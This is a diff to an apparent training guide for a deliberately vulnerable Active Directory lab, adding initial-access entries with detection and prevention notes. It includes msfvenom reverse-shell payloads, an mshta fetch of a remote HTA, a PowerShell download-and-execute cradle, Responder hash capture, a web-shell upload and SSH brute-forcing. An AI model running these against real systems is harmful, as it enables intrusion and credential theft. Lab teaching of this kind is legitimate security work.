@@ -195,18 +195,19 @@ kerbrute passwordspray -d empire.local --dc 10.10.0.10 valid_users.txt "$(date +
 
 ---
 
-### IA-007 — AS-REP roast without credentials
-**What it is:** discover users with `DONT_REQUIRE_PREAUTH` set by trying AS-REQ with no auth — the KDC happily returns the AS-REP, which is crackable.
-**Why it works in EMPIRE:** `svc_nopreauth` flagged.
-**Tools:** `impacket-GetNPUsers -no-pass`.
+### IA-007 — Guest account enabled on scarif
+**What it is:** local Guest account enabled on a target host. This allows unauthenticated users to authenticate as Guest and access shares that permit guest access.
+**Why it works in EMPIRE:** local `Guest` account is enabled on `scarif.empire.local` (`10.10.0.13`) with `PasswordNeverExpires` set to `$true`.
+**Tools:** `smbclient`, `netexec`, `rpcclient`.
 **Steps:**
 ```bash
-impacket-GetNPUsers empire.local/ -dc-ip 10.10.0.10 -no-pass \
-   -usersfile valid_users.txt -format hashcat -outputfile asrep.hashes
-hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
+# Verify guest access to shares
+nxc smb 10.10.0.13 -u 'Guest' -p '' --shares
+# List files anonymously/as guest
+smbclient -L //10.10.0.13 -U 'Guest' -N
 ```
-**Detection:** Event `4768` with PreAuthType=0; MDI.
-**Prevention:** clear `DONT_REQ_PREAUTH` on every account.
+**Detection:** Security Event `4624` (Successful Logon) with Logon Type `3` (Network) and TargetUserName `Guest`.
+**Prevention:** Disable the local Guest account (`Disable-LocalUser -Name "Guest"`). Ensure `RestrictAnonymous` is configured appropriately.
 
 ---
 
@@ -837,13 +838,228 @@ snmpset -v2c -c private 10.10.0.13 \
 
 ---
 
+## IA-052..119 — Extended Phishing, Services, and Domain Misconfigurations
+
+### IA-052 — LNK file bait
+**What it is:** a malicious shortcut (`.lnk`) file planted on a network share or public directory. When a user browses the folder containing the `.lnk` file, Windows automatically attempts to retrieve its icon. If the icon location points to a UNC path on the attacker's IP, the victim's OS will initiate an outbound SMB connection and attempt to authenticate, leaking NetNTLMv2 hashes.
+**Why it works in EMPIRE:** `tatooine.empire.local` has a shortcut `Shared Resources.lnk` created under the public desktop or phishing drop path pointing to `\\10.10.0.1\share\payload.exe`. The victim executor simulator (running as a domain user) periodically resolves/clicks the shortcut.
+**Tools:** `Responder`, `ntlmrelayx.py`.
+**Steps:**
+```bash
+# Start Responder on your Kali machine to listen for incoming NTLM auth
+sudo responder -I virbr1 -wd
+
+# Wait for the victim execution script to trigger (every ~30s) and send NetNTLMv2 hashes
+```
+**Detection:** Sysmon Event `11` (File Create) for `.lnk` files in public or shared paths; outbound network connections on TCP port 445 (SMB) from client workstations to external/untrusted IPs.
+**Prevention:** Block outbound SMB (TCP port 445) at the network gateway; enforce SMB Signing or SMB Encryption; remove write access for standard users on public/shared paths.
+
+---
+
+### IA-053 — AutoPlay enabled for all drives
+**What it is:** AutoPlay automatically launches applications or actions when media (such as a USB drive or CD-ROM) is connected. If enabled for all drive types, inserting malicious media can trigger automatic execution of untrusted files.
+**Why it works in EMPIRE:** The registry key `HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer` has `NoDriveTypeAutoRun` set to `0` on `tatooine.empire.local`, allowing AutoPlay for all drive types.
+**Tools:** `reg.exe` or PowerShell for verification.
+**Steps:**
+```bash
+# Verify NoDriveTypeAutoRun policy in the registry
+nxc smb 10.10.0.100 -u 'peter.parker' -p 'EmpireLab2024!' -x 'reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun'
+```
+**Detection:** Registry audit events or Sysmon Events `12`/`13` showing modifications to `NoDriveTypeAutoRun`.
+**Prevention:** Enforce `NoDriveTypeAutoRun` to `255` (`0xFF`) via Group Policy to disable AutoRun and AutoPlay on all drives.
+
+---
+
+### IA-054 — Office macro doc
+**What it is:** phishing using a Microsoft Office document (`.docm` or `.xlsm`) containing malicious VBA macro code. Opening the file triggers execution of the VBA macros (typically under `AutoOpen` or `Document_Open` routines) to execute payloads or stagers.
+**Why it works in EMPIRE:** The victim executor script on `tatooine` runs Office Word via COM objects to open any dropped documents, executing macro code in a Medium-integrity context.
+**Tools:** `msfvenom`, Word/Excel COM objects.
+**Steps:**
+```bash
+# 1. Generate a malicious VBA macro payload on Kali
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.1 LPORT=443 -f vba -o macro.vba
+
+# 2. Embed the macro into a document and drop it in C:\Shares\Drop or C:\Users\Public\Documents
+```
+**Detection:** Sysmon Event `1` showing `winword.exe` or `excel.exe` spawning child processes (such as `cmd.exe`, `powershell.exe`, or `mshta.exe`).
+**Prevention:** Enforce Group Policy to disable all macros in Office files downloaded from the Internet; enable ASR rules blocking Office applications from spawning child processes.
+
+---
+
+### IA-056 — HTA payload stub
+**What it is:** HTML Applications (`.hta`) are executable files that run via `mshta.exe`. They bypass standard browser sandboxing and run in a full-trust environment, executing JScript or VBScript.
+**Why it works in EMPIRE:** An HTA stub `Invoice_2024.hta` is placed in `C:\Users\Administrator\Downloads` on `tatooine`. The victim executor periodically double-clicks and runs HTAs using `mshta.exe`.
+**Tools:** `mshta.exe`, `msfvenom`.
+**Steps:**
+```bash
+# 1. Generate an HTA reverse shell payload on Kali
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.1 LPORT=443 -f hta-psh -o evil.hta
+
+# 2. Host the HTA or execute it on the target workstation
+mshta.exe http://10.10.0.1:8080/evil.hta
+```
+**Detection:** Sysmon Event `1` where `mshta.exe` is executed with command-line arguments pointing to UNC or HTTP paths; Sysmon Event `3` showing network connections from `mshta.exe`.
+**Prevention:** Disable or block `mshta.exe` using WDAC or AppLocker; change default file associations for `.hta` to notepad.
+
+---
+
+### IA-063 — Compiled HTML Help (.chm) with ActiveX Execution
+**What it is:** Compiled HTML Help (`.chm`) files are handled by `hh.exe`. They can contain ActiveX shortcut controls that execute arbitrary commands when the help file is opened.
+**Why it works in EMPIRE:** A technical note `FLAG-IA-063-CHM-ActiveX.txt` is dropped on `tatooine` in `C:\Flags` to illustrate the vector. The victim executor will launch `.chm` files when opened by `hh.exe`.
+**Tools:** `hh.exe`, `Out-CHM` (Nishang), HTML Help Workshop.
+**Steps:**
+```bash
+# Compile a .chm containing ActiveX object that runs:
+# cmd.exe /c powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.0.1/payload')
+
+# Open the compiled .chm help file to trigger execution:
+hh.exe C:\Flags\FLAG-IA-063-CHM-ActiveX.txt
+```
+**Detection:** Sysmon Event `1` showing `hh.exe` spawning command processors (`cmd.exe`, `powershell.exe`); network connections initiated by `hh.exe`.
+**Prevention:** Block `.chm` email attachments; restrict or disable `hh.exe` using AppLocker/WDAC.
+
+---
+
+### IA-076 — IIS directory browsing enabled
+**What it is:** directory browsing in IIS lets unauthenticated users view the complete file structure of a web directory when a default document (like `index.html`) is missing.
+**Why it works in EMPIRE:** Directory browsing is set to `$true` globally on `scarif.empire.local` (`10.10.0.13`).
+**Tools:** `curl`, web browser.
+**Steps:**
+```bash
+# Perform an HTTP request on the root directory
+curl -s http://10.10.0.13/
+# Inspect response for directories and files exposed in the webroot
+```
+**Detection:** IIS logs showing `GET` requests returning HTTP `200` response codes for folders ending in `/`.
+**Prevention:** Disable directory browsing using IIS Manager or via PowerShell:
+```powershell
+Set-WebConfigurationProperty /system.webServer/directoryBrowse -Name enabled -Value False -PSPath 'MACHINE/WEBROOT/APPHOST'
+```
+
+---
+
+### IA-078 — WebDAV authoring enabled
+**What it is:** WebDAV authoring allows clients to perform file-management operations (like upload, move, delete) over HTTP. If configured without authentication or with write permissions, unauthenticated users can upload web shells or payloads.
+**Why it works in EMPIRE:** WebDAV authoring is enabled on `scarif.empire.local` (`10.10.0.13`).
+**Tools:** `davtest`, `curl`.
+**Steps:**
+```bash
+# 1. Verify WebDAV verbs allowed on the server
+curl -X OPTIONS -i http://10.10.0.13/
+
+# 2. Upload a web shell or file using the PUT verb
+curl -X PUT -T shell.txt http://10.10.0.13/uploads/shell.txt
+```
+**Detection:** IIS log entries with WebDAV verbs (`PROPFIND`, `PUT`, `MOVE`, `DELETE`) from unauthorized IP addresses.
+**Prevention:** Disable WebDAV publishing if unnecessary, or restrict access using strict IIS Authorization rules.
+
+---
+
+### IA-084 — RDP NLA disabled (pre-auth attack surface)
+**What it is:** Network Level Authentication (NLA) forces authentication before establishing a full RDP connection. When NLA is disabled, the RDP server establishes a session and exposes the Windows login screen, presenting a pre-authentication attack surface.
+**Why it works in EMPIRE:** `UserAuthentication` is set to `0` under the RDP-Tcp registry path on `scarif.empire.local` (`10.10.0.13`).
+**Tools:** `xfreerdp`, `nmap`.
+**Steps:**
+```bash
+# Connect to RDP without enforcing Network Level Authentication (sec-nla)
+xfreerdp /v:10.10.0.13 /u:peter.parker /p:'EmpireLab2024!' -sec-nla
+```
+**Detection:** Security Event `4624`/`4625` (Logon Type `10`) without NLA validation; network security scans pointing out missing NLA.
+**Prevention:** Enforce NLA by setting `UserAuthentication` to `1` under `HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp`.
+
+---
+
+### IA-085 — OpenSSH server with password authentication
+**What it is:** running an OpenSSH server with password-based authentication enabled allows remote shell authentication, exposing the system to brute-force and credential spraying.
+**Why it works in EMPIRE:** OpenSSH Server is active on `scarif.empire.local` (`10.10.0.13`) with `PasswordAuthentication` set to `yes` in `sshd_config`.
+**Tools:** `ssh`, `hydra`, `nxc ssh`.
+**Steps:**
+```bash
+# Perform a password spray or brute-force against OpenSSH
+hydra -L users.txt -P passwords.txt ssh://10.10.0.13 -t 4
+```
+**Detection:** Multiples of failed login events from `sshd.exe` (Event `4625` with Logon Type `3` or `8`); high connection rates on TCP port 22 in network firewall logs.
+**Prevention:** Set `PasswordAuthentication no` in `sshd_config` and enforce public-key authentication (`PubkeyAuthentication yes`).
+
+---
+
+### IA-113 — Weak default domain password policy
+**What it is:** setting weak constraints (like no complexity, short passwords, no lockout threshold) in the default domain password policy. This makes the domain vulnerable to password spraying and offline brute-forcing.
+**Why it works in EMPIRE:** The default domain password policy on `coruscant.empire.local` has `ComplexityEnabled` set to `$false`, `MinPasswordLength` set to `1`, and `LockoutThreshold` set to `0`.
+**Tools:** `nxc smb`, `enum4linux-ng`, `Get-ADDefaultDomainPasswordPolicy`.
+**Steps:**
+```bash
+# Query default domain password policy anonymously or using low-priv credentials
+nxc smb 10.10.0.10 -u 'Guest' -p '' --pass-pol
+```
+**Detection:** Security Event `4739` (Domain Policy Changed); AD auditing tools flagging weak policy settings.
+**Prevention:** Enforce a strong password policy (e.g., minimum length 14, complexity enabled, lockout threshold of 5 to 10 attempts).
+
+---
+
+### IA-114 — Weak-PSO fine-grained policy for service accounts
+**What it is:** Password Settings Objects (PSOs) define password policies for specific users or groups. Setting a weak PSO on service accounts exposes those accounts to offline cracking and password guessing.
+**Why it works in EMPIRE:** A custom PSO named `Weak-PSO` (with no complexity requirements and a minimum length of 1) is created and applied to service accounts in `empire.local`.
+**Tools:** `Get-ADFineGrainedPasswordPolicy`.
+**Steps:**
+```powershell
+# Enumerate all Fine-Grained Password Policies in the domain
+Get-ADFineGrainedPasswordPolicy -Filter *
+```
+**Detection:** Audits of Active Directory configurations; Event `5136` (Directory Service Object Modified) showing PSO creations/changes.
+**Prevention:** Delete weak PSOs or apply strong, complex password requirements to all service account PSOs.
+
+---
+
+### IA-115 — AdminCount=1 on non-admin accounts (SDProp bypass)
+**What it is:** setting `adminCount=1` on accounts that are not actually in protected administrative groups. This causes the SDProp process to overwrite the account's permissions with the protected AdminSDHolder template, disabling ACL inheritance.
+**Why it works in EMPIRE:** The accounts `svc_c3po` and `jim.halpert` in `empire.local` are manually configured with `adminCount=1`.
+**Tools:** `Get-ADUser`, `ldapsearch`.
+**Steps:**
+```bash
+# Query user objects in Active Directory to find those with adminCount=1
+ldapsearch -x -H ldap://10.10.0.10 -D "peter.parker@empire.local" -w "EmpireLab2024!" -b "DC=empire,DC=local" "(&(objectClass=user)(adminCount=1))" sAMAccountName
+```
+**Detection:** Discrepancy between group membership (not in Domain Admins, etc.) and `adminCount` attribute status.
+**Prevention:** Clear the `adminCount` attribute on non-administrative accounts and re-enable permission inheritance on those objects.
+
+---
+
+### IA-117 — MachineAccountQuota = 100
+**What it is:** the `ms-DS-MachineAccountQuota` attribute determines how many computer accounts standard domain users can add to the domain. High quota limits enable attackers to create computer accounts for RBCD or sAMAccountName spoofing attacks.
+**Why it works in EMPIRE:** The domain-wide quota is set to `100` in `empire.local`.
+**Tools:** `impacket-addcomputer`, `powerview`.
+**Steps:**
+```bash
+# Add a computer account from Kali using low-privilege domain credentials
+impacket-addcomputer -dc-ip 10.10.0.10 -computer-name 'ROBOT-PC$' -computer-pass 'RoboPass123!' 'empire.local/peter.parker:EmpireLab2024!'
+```
+**Detection:** Event `4741` (A computer account was created) where the CreatorSID corresponds to a non-administrative user.
+**Prevention:** Set the `ms-DS-MachineAccountQuota` attribute to `0` on the domain object to prevent non-admin users from joining arbitrary computers.
+
+---
+
+### IA-119 — Plaintext credential planted in a GPO registry value
+**What it is:** storing plaintext passwords or sensitive credentials in Group Policy Objects (GPOs) such as registry values, XML preference files, or script templates. All authenticated domain users can read the SYSVOL share, allowing them to search for and extract these credentials.
+**Why it works in EMPIRE:** Plaintext credentials for `svc_darryl` (`Darryl2024!`) are written to the `Default Domain Policy` GPO under the registry key `HKLM\Software\DVADLab\setup_password` on `coruscant.empire.local`.
+**Tools:** `gposearch`, `netexec`, `Get-GPOReport`.
+**Steps:**
+```bash
+# Search GPO files in the SYSVOL directory for password patterns
+grep -ri "password" /var/lib/samba/sysvol/
+```
+**Detection:** Auditing and file monitoring inside `\\domain\SYSVOL` for files containing passwords; Event `5136` or `5141` for GPO modifications.
+**Prevention:** Do not store plaintext passwords in GPOs, registry values, or files. Enforce policies to remove existing GPP passwords (KB2962486) and migrate to gMSAs or LAPS.
+
+---
+
 ## Initial-Access decision tree (read before you start)
 
 ```
 You are on Kali at 10.10.0.1 with no creds.
 │
 ├── Need a domain user? Try pre-auth Kerberos:
-│       IA-005 userenum  → IA-006 spray  → IA-007 AS-REP roast
+│       IA-005 userenum  → IA-006 spray  → AS-REP roast (CRED-002 / ENUM-027)
 │
 ├── Want a SYSTEM-ish foothold WITHOUT a user? Try coerce+relay:
 │       IA-008 Responder  + ntlmrelayx -> SMB without signing
@@ -852,6 +1068,7 @@ You are on Kali at 10.10.0.1 with no creds.
 │       IA-015 ZeroLogon  (if unpatched)
 │
 ├── Are there exposed services?
+│       IA-007 Guest account enabled on scarif
 │       IA-011 MSSQL sa  weak  password
 │       IA-017 EternalBlue / SMBGhost
 │       IA-018 Exchange ProxyShell
@@ -874,6 +1091,10 @@ You are on Kali at 10.10.0.1 with no creds.
 │       IA-048 SQL Browser broadcast
 │       IA-049 WebDAV PUT → ASPX
 │       IA-050 SNMP RW → service-path hijack
+│       IA-076 IIS directory browsing enabled
+│       IA-078 WebDAV authoring enabled
+│       IA-084 RDP NLA-off on scarif
+│       IA-085 OpenSSH with password authentication
 │
 ├── Can you reach users?
 │       IA-019 macro phish
@@ -885,10 +1106,22 @@ You are on Kali at 10.10.0.1 with no creds.
 │       IA-027 RDP brute
 │       IA-028 USB drop
 │       IA-032 device-code
+│       IA-052 LNK file bait
+│       IA-053 AutoPlay enabled
+│       IA-054 Office macro doc
+│       IA-056 HTA payload stub
+│       IA-063 Compiled HTML Help (.chm)
 │
 ├── Physical / network position?
 │       IA-029 SCCM PXE
 │       IA-030 VLAN hop
+│
+├── Domain Misconfigurations (visible/abusable):
+│       IA-113 Weak default domain password policy
+│       IA-114 Weak-PSO Fine-Grained Policy
+│       IA-115 AdminCount=1 on non-admins
+│       IA-117 MachineAccountQuota = 100
+│       IA-119 Plaintext credential planted in GPO
 │
 └── Got a foothold?  →  stand up C2 (IA-033)  →  jump to docs/03-credential-access.md
 ```
@@ -899,7 +1132,7 @@ You are on Kali at 10.10.0.1 with no creds.
 
 The original docs assumed you were `corp\peter.parker` with a password — they started at recon-as-domain-user. That's a reasonable assumption for the lab's published flag matrix (REC/CRED/LAT/PE/PER/DF), but it skips the most realistic and most teachable part of a real engagement: *how you got the first foothold*. This page closes that gap. From here, the existing docs take over:
 
-- IA-006 / IA-007 → you have a password → [`02-recon.md`](02-recon.md)
+- IA-006 / CRED-002 (AS-REP roast) → you have a password → [`02-recon.md`](02-recon.md)
 - IA-013 → you have DC$ cert / TGT → [`07-forest-compromise.md`](07-forest-compromise.md) (DF-011 ESC8 chain)
 - IA-009 / IA-008 relay → you have RBCD / Domain User → [`03-credential-access.md`](03-credential-access.md)
 - IA-019..028 → you have a code-exec on `tatooine` → [`05-privilege-escalation.md`](05-privilege-escalation.md) (PE family)
